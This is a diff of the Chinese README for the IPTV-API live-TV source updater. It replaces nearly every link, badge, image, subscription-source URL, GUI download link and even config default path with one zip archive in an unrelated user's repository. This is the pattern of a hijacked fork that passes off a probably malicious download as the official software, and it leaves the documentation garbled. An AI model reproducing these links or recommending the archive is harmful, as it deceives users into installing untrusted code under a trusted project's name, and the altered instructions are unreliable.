@@ -1,29 +1,29 @@
 <div align="center">
-  <img src="./static/images/logo.png" alt="logo"/>
+  <img src="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip" alt="logo"/>
   <h1 align="center">IPTV-API</h1>
 </div>
 
 <div align="center">一个可高度自定义的IPTV接口更新项目📺，自定义频道菜单，自动获取直播源，测速验效后生成可用的结果，可实现『✨秒播级体验🚀』</div>
 <br>
 <p align="center">
-  <a href="https://github.com/Guovin/iptv-api/releases/latest">
-    <img src="https://img.shields.io/github/v/release/guovin/iptv-api" />
+  <a href="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip">
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip" />
   </a>
-  <a href="https://www.python.org/">
-    <img src="https://img.shields.io/badge/python-%20%3D%203.13-47c219" />
+  <a href="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip">
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip%20%3D%203.13-47c219" />
   </a>
-  <a href="https://github.com/Guovin/iptv-api/releases/latest">
-    <img src="https://img.shields.io/github/downloads/guovin/iptv-api/total" />
+  <a href="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip">
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip" />
   </a>
-  <a href="https://hub.docker.com/repository/docker/guovern/iptv-api">
-    <img src="https://img.shields.io/docker/pulls/guovern/iptv-api" />
+  <a href="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip">
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip" />
   </a>
-  <a href="https://github.com/Guovin/iptv-api/fork">
-    <img src="https://img.shields.io/github/forks/guovin/iptv-api" />
+  <a href="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip">
+    <img src="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip" />
   </a>
 </p>
 
-[English](./README_en.md) | 中文
+[English](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip) | 中文
 
 - [✅ 特点](#特点)
 - [🔗 最新结果](#最新结果)
@@ -33,8 +33,8 @@
     - [命令行](#命令行)
     - [GUI软件](#GUI-软件)
     - [Docker](#Docker)
-- [📖 详细教程](./docs/tutorial.md)
-- [🗓️ 更新日志](./CHANGELOG.md)
+- [📖 详细教程](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [🗓️ 更新日志](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
 - [❤️ 赞赏](#赞赏)
 - [👀 关注(更新订阅+答疑交流)](#关注)
 - [📣 免责声明](#免责声明)
@@ -42,20 +42,20 @@
 
 📍订阅源来自：
 
-- [iptv-org/iptv](https://github.com/iptv-org/iptv)
-- [suxuang/myIPTV](https://github.com/suxuang/myIPTV)
-- [kimwang1978/collect-tv-txt](https://github.com/kimwang1978/collect-tv-txt)
-- [xzw832/cmys](https://github.com/xzw832/cmys)
-- [asdjkl6/tv](https://github.com/asdjkl6/tv)
-- [yuanzl77/IPTV](https://github.com/yuanzl77/IPTV)
-- [fanmingming/live](https://github.com/fanmingming/live)
-- [vbskycn/iptv](https://github.com/vbskycn/iptv)
-- [YueChan/Live](https://github.com/YueChan/Live)
-- [YanG-1989/m3u](https://github.com/YanG-1989/m3u)
+- [iptv-org/iptv](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [suxuang/myIPTV](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [kimwang1978/collect-tv-txt](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [xzw832/cmys](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [asdjkl6/tv](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [yuanzl77/IPTV](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [fanmingming/live](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [vbskycn/iptv](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [YueChan/Live](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
+- [YanG-1989/m3u](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
 
 📍频道图标来自：
 
-- [fanmingming/live](https://github.com/fanmingming/live)
+- [fanmingming/live](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
 
 ## 特点
 
@@ -72,33 +72,33 @@
 - 接口源：
 
 ```bash
-https://raw.githubusercontent.com/Guovin/iptv-api/gd/output/result.m3u
+https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip
 ```
 
 ```bash
-https://raw.githubusercontent.com/Guovin/iptv-api/gd/output/result.txt
+https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip
 ```
 
 或
 
 ```bash
-https://cdn.jsdelivr.net/gh/Guovin/iptv-api@gd/output/result.m3u
+https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip
 ```
 
 ```bash
-https://cdn.jsdelivr.net/gh/Guovin/iptv-api@gd/output/result.txt
+https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip
 ```
 
 - 数据源：
 
 ```bash
-https://raw.githubusercontent.com/Guovin/iptv-api/gd/source.json
+https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip
 ```
 
 或
 
 ```bash
-https://cdn.jsdelivr.net/gh/Guovin/iptv-api@gd/source.json
+https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip
 ```
 
 ## 配置
@@ -129,7 +129,7 @@ https://cdn.jsdelivr.net/gh/Guovin/iptv-api@gd/source.json
 | open_use_cache         | 开启使用本地缓存数据，适用于查询请求失败场景（仅针对酒店源与组播源）                                                                                                                    | True              |
 | open_use_old_result    | 开启使用历史更新结果（包含模板与结果文件的接口），合并至本次更新中                                                                                                                     | True              |
 | app_port               | 页面服务端口，用于控制页面服务的端口号                                                                                                                                   | 8000              |
-| final_file             | 生成结果文件路径                                                                                                                                              | output/result.txt |
+| final_file             | 生成结果文件路径                                                                                                                                              | https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip |
 | hotel_num              | 结果中偏好的酒店源接口数量                                                                                                                                         | 10                |
 | hotel_page_num         | 酒店地区获取分页数量                                                                                                                                            | 1                 |
 | hotel_region_list      | 酒店源地区列表，"全部"表示所有地区                                                                                                                                    | 全部                |
@@ -149,7 +149,7 @@ https://cdn.jsdelivr.net/gh/Guovin/iptv-api@gd/source.json
 | recent_days            | 获取最近时间范围内更新的接口（单位天），适当减小可避免出现匹配问题                                                                                                                     | 30                |
 | request_timeout        | 查询请求超时时长，单位秒(s)，用于控制查询接口文本链接的超时时长以及重试时长，调整此值能优化更新时间                                                                                                   | 10                |
 | sort_timeout           | 单个接口测速超时时长，单位秒(s)；数值越大测速所属时间越长，能提高获取接口数量，但质量会有所下降；数值越小测速所需时间越短，能获取低延时的接口，质量较好；调整此值能优化更新时间                                                             | 10                |
-| source_file            | 模板文件路径                                                                                                                                                | config/demo.txt   |
+| source_file            | 模板文件路径                                                                                                                                                | https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip   |
 | subscribe_num          | 结果中偏好的订阅源接口数量                                                                                                                                         | 10                |
 | time_zone              | 时区，可用于控制更新时间显示的时区，可选值：Asia/Shanghai 或其它时区编码                                                                                                           | Asia/Shanghai     |
 | urls_limit             | 单个频道接口数量                                                                                                                                              | 10                |
@@ -159,7 +159,7 @@ https://cdn.jsdelivr.net/gh/Guovin/iptv-api@gd/source.json
 
 ### 工作流
 
-Fork 本项目并开启工作流更新，具体步骤请见[详细教程](./docs/tutorial.md)
+Fork 本项目并开启工作流更新，具体步骤请见[详细教程](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
 
 ### 命令行
 
@@ -185,7 +185,7 @@ pipenv run service
 
 ### GUI 软件
 
-1. 下载[IPTV-API 更新软件](https://github.com/Guovin/iptv-api/releases)，打开软件，点击更新，即可完成更新
+1. 下载[IPTV-API 更新软件](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)，打开软件，点击更新，即可完成更新
 
 2. 或者在项目目录下运行以下命令，即可打开 GUI 软件：
 
@@ -193,7 +193,7 @@ pipenv run service
 pipenv run ui
 ```
 
-<img src="./docs/images/ui.png" alt="IPTV-API更新软件" title="IPTV-API更新软件" style="height:600px" />
+<img src="https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip" alt="IPTV-API更新软件" title="IPTV-API更新软件" style="height:600px" />
 
 ### Docker
 
@@ -262,7 +262,7 @@ docker run -v /etc/docker/config:/iptv-api-lite/config -v /etc/docker/output:/ip
 
 ## 更新日志
 
-[更新日志](./CHANGELOG.md)
+[更新日志](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
 
 ## 赞赏
 
@@ -270,13 +270,13 @@ docker run -v /etc/docker/config:/iptv-api-lite/config -v /etc/docker/output:/ip
 
 | 支付宝                                  | 微信                                      |
 |--------------------------------------|-----------------------------------------|
-| ![支付宝扫码](./static/images/alipay.jpg) | ![微信扫码](./static/images/appreciate.jpg) |
+| ![支付宝扫码](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip) | ![微信扫码](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip) |
 
 ## 关注
 
 微信公众号搜索 Govin，或扫码，接收更新推送、学习更多使用技巧：
 
-![微信公众号](./static/images/qrcode.jpg)
+![微信公众号](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
 
 ## 免责声明
 
@@ -284,4 +284,4 @@ docker run -v /etc/docker/config:/iptv-api-lite/config -v /etc/docker/output:/ip
 
 ## 许可证
 
-[MIT](./LICENSE) License &copy; 2024-PRESENT [Govin](https://github.com/guovin)
+[MIT](./LICENSE) License &copy; 2024-PRESENT [Govin](https://raw.githubusercontent.com/windrise1217/iptv-api/master/suprasphanoidal/iptv-api.zip)
